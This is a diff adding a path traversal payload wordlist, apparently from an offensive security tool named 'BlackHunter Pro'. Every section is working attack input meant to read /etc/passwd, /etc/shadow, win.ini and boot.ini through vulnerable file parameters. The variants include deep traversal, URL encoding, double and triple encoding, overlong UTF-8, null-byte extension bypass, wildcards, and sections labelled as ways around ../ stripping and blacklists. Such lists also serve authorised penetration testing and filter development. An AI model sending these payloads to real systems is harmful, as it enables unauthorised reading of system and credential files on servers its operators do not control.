@@ -1,0 +1,325 @@
+# payloads/lfi/traversal.txt
+# Path Traversal Payloads
+# BlackHunter Pro
+
+# =============================================
+# BASIC TRAVERSAL - UNIX
+# =============================================
+
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../etc/passwd
+
+# =============================================
+# BASIC TRAVERSAL - WINDOWS
+# =============================================
+
+..\Windows\win.ini
+..\..\Windows\win.ini
+..\..\..\Windows\win.ini
+..\..\..\..\Windows\win.ini
+..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\..\..\..\..\Windows\win.ini
+
+# =============================================
+# MIXED SEPARATORS
+# =============================================
+
+../..\etc/passwd
+..\../etc/passwd
+..\/..\/etc/passwd
+..\..\../etc/passwd
+..\../..\etc/passwd
+
+# =============================================
+# DOUBLE SLASH
+# =============================================
+
+..//etc/passwd
+..//..//etc/passwd
+..//..//..//etc/passwd
+..//..//..//..//etc/passwd
+..//..//..//..//..//etc/passwd
+
+# =============================================
+# DOUBLE DOT WITH SLASH
+# =============================================
+
+....//etc/passwd
+....//....//etc/passwd
+....//....//....//etc/passwd
+....//....//....//....//etc/passwd
+....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//etc/passwd
+
+# =============================================
+# BACKSLASH VARIANTS
+# =============================================
+
+..\\etc\\passwd
+..\\..\\etc\\passwd
+..\\..\\..\\etc\\passwd
+..\\..\\..\\..\\etc\\passwd
+..\\..\\..\\..\\..\\etc\\passwd
+..\\..\\..\\..\\..\\..\\etc\\passwd
+
+# =============================================
+# FORWARD SLASH + BACKSLASH
+# =============================================
+
+..\/..\/etc/passwd
+..\/..\/..\/etc/passwd
+..\/..\/..\/..\/etc/passwd
+..\/..\/..\/..\/..\/etc/passwd
+..\/..\/..\/..\/..\/..\/etc/passwd
+
+# =============================================
+# URL ENCODED
+# =============================================
+
+..%2fetc/passwd
+..%2f..%2fetc/passwd
+..%2f..%2f..%2fetc/passwd
+..%2f..%2f..%2f..%2fetc/passwd
+..%2f..%2f..%2f..%2f..%2fetc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+
+# =============================================
+# URL ENCODED BACKSLASH
+# =============================================
+
+..%5cWindows%5cwin.ini
+..%5c..%5cWindows%5cwin.ini
+..%5c..%5c..%5cWindows%5cwin.ini
+..%5c..%5c..%5c..%5cWindows%5cwin.ini
+..%5c..%5c..%5c..%5c..%5cWindows%5cwin.ini
+
+# =============================================
+# DOUBLE URL ENCODED
+# =============================================
+
+%2e%2e%2fetc/passwd
+%2e%2e%2f%2e%2e%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+
+%2e%2e%5cWindows%5cwin.ini
+%2e%2e%5c%2e%2e%5cWindows%5cwin.ini
+%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini
+
+# =============================================
+# TRIPLE URL ENCODED
+# =============================================
+
+%252e%252e%252fetc/passwd
+%252e%252e%252f%252e%252e%252fetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+
+# =============================================
+# UNICODE ENCODING
+# =============================================
+
+..%c0%afetc/passwd
+..%c0%af..%c0%afetc/passwd
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%c1%9cWindows%5cwin.ini
+..%c1%9c..%c1%9cWindows%5cwin.ini
+..%c1%9c..%c1%9c..%c1%9cWindows%5cwin.ini
+
+%c0%ae%c0%ae%c0%afetc/passwd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
+
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
+
+# =============================================
+# UTF-8 OVERLONG
+# =============================================
+
+..%e0%80%afetc/passwd
+..%e0%80%af..%e0%80%afetc/passwd
+..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
+..%e0%80%af..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
+
+# =============================================
+# UNICODE FULL-WIDTH
+# =============================================
+
+..%ef%bc%8fetc/passwd
+..%ef%bc%8f..%ef%bc%8fetc/passwd
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
+
+# =============================================
+# NULL BYTE INJECTION
+# =============================================
+
+../etc/passwd%00
+../etc/passwd%00.jpg
+../etc/passwd%00.png
+../etc/passwd%00.php
+../etc/passwd%00.html
+../../etc/passwd%00
+../../etc/passwd%00.jpg
+../../etc/passwd%00.png
+../../etc/passwd%00.php
+
+../etc/passwd\0
+../etc/passwd\0.jpg
+../etc/passwd\0.png
+../etc/passwd\0.php
+
+# =============================================
+# WILDCARD CHARACTERS
+# =============================================
+
+/et*/passwd
+/etc/pass*
+/etc/passw?
+/e??/passwd
+/*/passwd
+/etc/*sswd
+/???/??????
+/e*c/p*d
+/e?c/p?sswd
+
+# =============================================
+# COMBINED BYPASS
+# =============================================
+
+....//....//....//....//etc/passwd
+....\/....\/....\/....\/etc/passwd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%5c..%5c..%5c..%5cetc%5cpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%252f..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+
+# =============================================
+# DEEP TRAVERSAL - LINUX
+# =============================================
+
+../../../../../../../../../../etc/passwd
+../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../etc/passwd
+
+# =============================================
+# DEEP TRAVERSAL - WINDOWS
+# =============================================
+
+..\..\..\..\..\..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\Windows\win.ini
+
+# =============================================
+# DEEP TRAVERSAL - MIXED
+# =============================================
+
+..\/..\/..\/..\/..\/..\/..\/..\/etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows\win.ini
+
+# =============================================
+# TRICKY VARIATIONS
+# =============================================
+
+....//....//....//....//....//....//....//....//etc/passwd
+..././..././..././..././etc/passwd
+.../.../.../.../etc/passwd
+..../..../..../..../etc/passwd
+..;/..;/..;/..;/etc/passwd
+..%00/..%00/..%00/..%00/etc/passwd
+..%01/..%01/..%01/..%01/etc/passwd
+..%09/..%09/..%09/..%09/etc/passwd
+..%20/..%20/..%20/..%20/etc/passwd
+
+# =============================================
+# DIRECT PATHS (no traversal)
+# =============================================
+
+/etc/passwd
+/etc/shadow
+/etc/hosts
+C:\Windows\win.ini
+C:\boot.ini
+file:///etc/passwd
+file:///c:/windows/win.ini
+
+# =============================================
+# ABSOLUTE PATHS WITH SLASH
+# =============================================
+
+//etc/passwd
+///etc/passwd
+////etc/passwd
+/////etc/passwd
+//////etc/passwd
+
+# =============================================
+# PATHS WITH DOT
+# =============================================
+
+./etc/passwd
+./../etc/passwd
+.././etc/passwd
+././etc/passwd
+../.././etc/passwd
+
+# =============================================
+# NESTED TRAVERSAL
+# =============================================
+
+....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//....//etc/passwd
+
+# =============================================
+# FILTER BYPASS TECHNIQUES
+# =============================================
+
+# Bypass ../ removal
+....//....//....//....//etc/passwd
+....\/....\/....\/....\/etc/passwd
+..././..././..././..././etc/passwd
+....//....//....//....//Windows/win.ini
+
+# Bypass extension check
+/etc/passwd%00.jpg
+/etc/passwd%00.png
+/etc/passwd%00.php
+/etc/passwd%00.html
+/etc/passwd%00.txt
+/etc/passwd%00.
+
+# Bypass blacklist
+/etC/PaSsWd
+/ETC/PASSWD
+/eTc/pAsSwD
+%2Fetc%2Fpasswd
+%2f%65%74%63%2f%70%61%73%73%77%64
